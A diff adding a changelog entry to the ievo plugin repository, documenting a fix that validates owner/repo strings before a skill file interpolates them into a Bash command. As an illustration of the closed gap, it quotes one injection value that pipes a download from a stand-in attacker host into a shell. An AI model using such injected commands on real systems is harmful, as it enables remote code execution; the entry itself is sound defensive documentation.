@@ -6,6 +6,17 @@ Entries are reverse-chronological (newest first) and reference the merging PR + 
 
 ---
 
+## v0.52.1
+
+Validate `<owner>/<repo>` against a strict allowlist before `index-repos/SKILL.md` interpolates it into a `node scan_repo.mjs` Bash invocation — closes #356.
+
+- **Gap closed** — Step 2 ("Per-repo invocation") built the literal Bash command `node "${CLAUDE_PLUGIN_ROOT}/scripts/scan_repo.mjs" <owner>/<repo> --output-dir ... --checkout-dir ...` and substituted the caller-supplied `<owner>/<repo>` raw, with no validation instruction anywhere in the file — unlike `security-check/SKILL.md` Step 2 and `inspect/SKILL.md` Step 1, which already enforce an owner/repo allowlist. That string can originate from an untrusted source (`discover.mjs`'s `candidates[].source_repo`, itself pulled from the skills.sh API / a marketplace catalog entry), so a crafted value such as `` foo/`curl evil.tld|sh` `` — a perfectly legal opaque string in an external JSON response, though not a legal GitHub slug — would be shell-interpreted the moment the Bash line ran, before `scan_repo.mjs`'s own internal `OWNER_REPO_RE` check (which only protects paths the script constructs *after* it receives the string) ever got a chance to reject it.
+- **Fix** — inserted a new Step 2 ("Validate each `<owner>/<repo>`") immediately before the Bash invocation (now Step 3): check `<owner>` against `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$` and `<repo>` against `^[A-Za-z0-9._-]{1,100}$` (matching `scan_repo.mjs`'s own `OWNER_REPO_RE` constant), refuse and report "invalid characters" on failure instead of interpolating, and continue with the remaining valid repos in a multi-repo input list. Added a corresponding invariant to the Rules section, mirroring the pattern already used in `security-check/SKILL.md` and `inspect/SKILL.md`.
+- **Scope** — confined to `plugins/ievo/skills/index-repos/SKILL.md`; a textual instruction constraint plus the step renumbering it required, no script or test changes (`scan_repo.mjs`'s own allowlist was already correct — this closes the gap at the SKILL.md call site that builds the command line in the first place).
+- **Version** — bump per AGENTS.md rules (`fix:` → patch, edits a plugin file under `plugins/ievo/**`); `discover.mjs` and `evolution_candidates.mjs` `SCRIPT_VERSION`, `plugin.json`, `marketplace.json`, and the AGENTS.md compliance ledger updated in lockstep. No `plugins/ievo/scripts/` logic change — the 100% coverage gate is untouched.
+
+---
+
 ## v0.52.0
 
 Add `/ievo:extract-best-practices` — session-pattern mining with optional upstream sharing — closes #387.
